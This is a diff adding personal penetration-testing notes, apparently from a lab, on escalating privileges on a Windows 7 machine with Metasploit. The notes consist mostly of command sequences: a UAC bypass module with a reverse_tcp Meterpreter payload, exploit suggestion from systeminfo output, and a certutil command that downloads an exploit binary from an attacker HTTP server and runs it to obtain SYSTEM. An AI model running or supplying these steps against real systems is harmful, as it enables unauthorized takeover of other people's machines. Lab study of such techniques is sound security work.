@@ -1,4 +1,101 @@
+Privilege Escalation w/ Empire, Metasploit
+
+
+
 linode - HS
 
-🟦 Windows 
+
+
+🟦 Windows  /  Metasploit sessions
+ 
+Bypass UAC 
+
+meterpreter > sysinfo                   #(x86 version = let's migrate)
+meterpreter > ps
+meterpreter > migrate 4040
+meterpreter > sysinfo                   #(x64 version = ok)
+meterpreter > background
+
+msf6 exploit(multi/handler) > search bypassuac
+msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_injection_winxs
+msf6 exploit(windows/local/bypassuac_injection_winxs) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/bypassuac_injection_winxs) > show options
+msf6 exploit(windows/local/bypassuac_injection_winxs) > set target Windows x64
+msf6 exploit(windows/local/bypassuac_injection_winxs) > set SESSION 1
+msf6 exploit(windows/local/bypassuac_injection_winxs) > run 
+
+meterpreter > getuid
+meterpreter > getprivs                  #(see and test the lists)
+
+Use kernel exploits
+
+meterpreter > sysinfo                   #(x86 version = let's migrate)
+meterpreter > ps
+meterpreter > migrate 1864
+meterpreter > sysinfo                   #(x64 version = ok)
+meterpreter > shell
+
+C:\Windows\system32 > 
+C:\Windows\system32 > systeminfo        #(copy/paste it on a note Windows 7.txt)
+
+
+
+ - On Kali (attacker VM)
+
+#(Git clone Windows Exploit Suggester)
+
+$ ./windows-explit-suggester.py --database 2021-04-08.xls --systeminfo ~/Desktop/Windows7.txt             #(see the exploit lists, MS16-032 or 135 = win binaries = dangerous to execute. Cautious)
+
+#(DL the MS16-035 binary on Github = 41015.exe on the disk)
+
+$ mv 41015.exe exploit.exe
+$ sudo python -m SimpleHTTPServer 80 ....
+
+
+ - On Meterpreter / Win7 (targer VM)
+ 
+meterpreter > getuid
+meterpreter > cd C:\Temp
+meterpreter > shell
+
+C:\Temp > certutil -urlcache -f http://10.10.10.10./exploit.exe exploit.exe
+C:\Temp > dir
+C:\Temp > exploit.exe           #(see the options, number 7 for Win7)
+C:\Temp >.\exploit.exe 
+
+
+#(New Shell)
+
+
+C:\Temp > whoami                   #(NT Authority\system)
+
+
+
+
+ 
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
